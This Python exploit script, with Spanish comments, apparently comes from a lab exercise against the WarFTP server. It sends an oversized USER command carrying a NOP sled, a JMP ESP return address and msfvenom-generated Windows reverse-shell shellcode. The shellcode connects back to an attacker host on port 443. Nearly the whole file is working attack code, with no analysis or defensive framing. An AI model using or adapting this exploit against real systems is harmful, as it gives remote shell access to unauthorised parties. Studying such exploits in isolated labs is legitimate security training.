#!/usr/bin/python
# JMP ESP \xD7\x30\x6B\x7E
# buffer = "\x90" * 485 Cantidad resltado del offset
# buffer += "\x90" * 100  Nops para rellenar 

import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

buffer = "\x90" * 485
buffer += "\xD7\x30\x6B\x7E"     
buffer += "\x90" * 100  

# Metiendo la reverse shell, msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443 -b '\x00\x0a\x0d\x20\x40' -f python

buf =  "\xcc"
buf += "\xdb\xde\xd9\x74\x24\xf4\x5d\xb8\x63\x5f\x35\xec\x31"
buf += "\xc9\xb1\x52\x83\xed\xfc\x31\x45\x13\x03\x26\x4c\xd7"
buf += "\x19\x54\x9a\x95\xe2\xa4\x5b\xfa\x6b\x41\x6a\x3a\x0f"
buf += "\x02\xdd\x8a\x5b\x46\xd2\x61\x09\x72\x61\x07\x86\x75"
buf += "\xc2\xa2\xf0\xb8\xd3\x9f\xc1\xdb\x57\xe2\x15\x3b\x69"
buf += "\x2d\x68\x3a\xae\x50\x81\x6e\x67\x1e\x34\x9e\x0c\x6a"
buf += "\x85\x15\x5e\x7a\x8d\xca\x17\x7d\xbc\x5d\x23\x24\x1e"
buf += "\x5c\xe0\x5c\x17\x46\xe5\x59\xe1\xfd\xdd\x16\xf0\xd7"
buf += "\x2f\xd6\x5f\x16\x80\x25\xa1\x5f\x27\xd6\xd4\xa9\x5b"
buf += "\x6b\xef\x6e\x21\xb7\x7a\x74\x81\x3c\xdc\x50\x33\x90"
buf += "\xbb\x13\x3f\x5d\xcf\x7b\x5c\x60\x1c\xf0\x58\xe9\xa3"
buf += "\xd6\xe8\xa9\x87\xf2\xb1\x6a\xa9\xa3\x1f\xdc\xd6\xb3"
buf += "\xff\x81\x72\xb8\x12\xd5\x0e\xe3\x7a\x1a\x23\x1b\x7b"
buf += "\x34\x34\x68\x49\x9b\xee\xe6\xe1\x54\x29\xf1\x06\x4f"
buf += "\x8d\x6d\xf9\x70\xee\xa4\x3e\x24\xbe\xde\x97\x45\x55"
buf += "\x1e\x17\x90\xfa\x4e\xb7\x4b\xbb\x3e\x77\x3c\x53\x54"
buf += "\x78\x63\x43\x57\x52\x0c\xee\xa2\x35\x39\xef\xae\xca"
buf += "\x55\xed\xae\xd5\x1e\x78\x48\xbf\x70\x2d\xc3\x28\xe8"
buf += "\x74\x9f\xc9\xf5\xa2\xda\xca\x7e\x41\x1b\x84\x76\x2c"
buf += "\x0f\x71\x77\x7b\x6d\xd4\x88\x51\x19\xba\x1b\x3e\xd9"
buf += "\xb5\x07\xe9\x8e\x92\xf6\xe0\x5a\x0f\xa0\x5a\x78\xd2"
buf += "\x34\xa4\x38\x09\x85\x2b\xc1\xdc\xb1\x0f\xd1\x18\x39"
buf += "\x14\x85\xf4\x6c\xc2\x73\xb3\xc6\xa4\x2d\x6d\xb4\x6e"
buf += "\xb9\xe8\xf6\xb0\xbf\xf4\xd2\x46\x5f\x44\x8b\x1e\x60"
buf += "\x69\x5b\x97\x19\x97\xfb\x58\xf0\x13\x0b\x13\x58\x35"
buf += "\x84\xfa\x09\x07\xc9\xfc\xe4\x44\xf4\x7e\x0c\x35\x03"
buf += "\x9e\x65\x30\x4f\x18\x96\x48\xc0\xcd\x98\xff\xe1\xc7"

buffer+= buf





s.connect(('10.0.2.16',21))
data = s.recv(1024)
print ("Enviando el WarFTP...")
s.send('USER '+buffer+'\r\n')
data = s.recv(1024)
s.send(' PASS PASSWORD '+'\r\n')
s.close()
print ("Final")
